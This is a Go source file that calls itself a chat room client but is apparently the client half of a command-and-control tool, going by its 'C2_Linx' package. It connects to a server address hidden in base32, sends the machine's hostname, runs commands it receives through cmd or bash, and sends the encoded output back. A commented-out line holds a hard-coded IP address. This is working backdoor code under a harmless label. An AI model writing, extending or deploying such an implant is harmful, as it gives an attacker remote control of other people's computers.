// one sever to more client chat room
//This is chat client
package main

import (
	"C2_Linx/encode"
	"encoding/base32"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var nick string = ""  //
var msg_str []string
func main() {
	ip_port:=string(os.Args[1])
	data, err := base32.StdEncoding.DecodeString(ip_port)
	if err != nil {
		panic("failed to decode")
	}

	// Print decoded data
	conn, err := net.Dial("tcp", string(data)) //打开监听端口

	//conn, err := net.Dial("tcp", "43.143.18.98:8888") //打开监听端口
	if err != nil {
		fmt.Println("conn fail...")
	}
	defer conn.Close()
	fmt.Println("%212%23%89 \n")

	//fmt.Println("client connect server successed \n")

	//给自己取一个聊天室的昵称
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		return
	}
	rand.Seed(time.Now().UnixNano())
	randomNumStr := strconv.Itoa(rand.Intn(101))
	//fmt.Printf("Make a nickname:")
	//fmt.Scanf("%s", &nick)  //输入昵称
	//fmt.Println("hello : ", nick)  //客户端输出
	ver :=encode.Enc("nick|" + hostname + randomNumStr)
	conn.Write([]byte(ver)) //将信息发送给服务器端
	//conn.Write([]byte("nick|" + hostname + randomNumStr))
	//go Handle(conn)  //创建线程

	//var msg string
	for {
		//data := [...]byte{}
		//msg_read, err := conn.Read(data[:]) // 服务端返回的信息
		data := make([]byte, 1024*1024)        //创建一个字节流
		msg_read, err := conn.Read(data) //将读取的字节流赋值给msg_read和err
		if msg_read == 0 || err != nil { //如果字节流为0或者有错误
			break
		}

		//fmt.Println(string(data[0:msg_read])) //把字节流转换成字符串
		//dec(string(data[0:msg_read]))
		msg_str = strings.Split(encode.Dec(string(data[0:msg_read])), "|")
		//msg = "" //声明一个空的消息
		//fmt.Scan(&msg)  //输入消息
		//conn.Write([]byte("to_master|" + msg_str[0] + "|" + msg_str[1]))  //三段字节流 say | 昵称 | 发送的消息
		switch msg_str[0] {
		case "to_master":  //需要加密
			if runtime.GOOS == "windows" {
				shell_arg := []string{"/c", msg_str[2]}
				execcmd := exec.Command("cmd", shell_arg...)
				cmdout, err1 := execcmd.CombinedOutput()
				//encrypt(cmdout) //命令回显内容加密
				cmdoutStr := string(cmdout)

				conn.Write([]byte(encode.Enc("to_master|" + msg_str[1] + "|" + cmdoutStr))) //三段字节流 say | 昵称 | 发送的消息
				if err1 != nil {
					fmt.Println(err1)
				}
			} else {
				shell_arg := []string{"-c", msg_str[2]}
				execcmd := exec.Command("/bin/bash", shell_arg...)
				cmdout, err1 := execcmd.CombinedOutput()
				//fmt.Println(string(cmdout))
				//encrypt(cmdout) //命令回显内容加密
				cmdoutStr := string(cmdout)
				//fmt.Println("to_master|" + msg_str[1] + "|" + cmdoutStr)
				//conn.Write([]byte(("to_master|" + msg_str[1] + "|" + cmdoutStr))) //三段字节流 say | 昵称 | 发送的消息

				conn.Write([]byte(encode.Enc("to_master|" + msg_str[1] + "|" + cmdoutStr))) //三段字节流 say | 昵称 | 发送的消息
				if err1 != nil {
					fmt.Println(err1)
				}
			}
		case "checkalive":
			fmt.Println("%20%23")
		default:
			fmt.Println("def")
			//shell_arg := []string{"/c", msg_str[1]}
			//execcmd := exec.Command("cmd", shell_arg...)

			//conn.Write([]byte("to_master|" + msg_str[0] + "|"+cmdoutStr))  //三段字节流 say | 昵称 | 发送的消息
			//if msg == "quit" {  //如果消息为quit
			//	conn.Write([]byte("quit|" + nick))  //将quit字节流发送给服务器端
			//	break  //程序结束运行
			//}
		}
	}
}


//func Handle(conn net.Conn) {
//
//	for {
//
//		data := make([]byte, 255)  //创建一个字节流
//		msg_read, err := conn.Read(data)  //将读取的字节流赋值给msg_read和err
//		if msg_read == 0 || err != nil {  //如果字节流为0或者有错误
//			break
//		}
//
//		fmt.Println(string(data[0:msg_read]))  //把字节流转换成字符串
//		msg_str = strings.Split(string(data[0:msg_read]), "|")
//	}
//}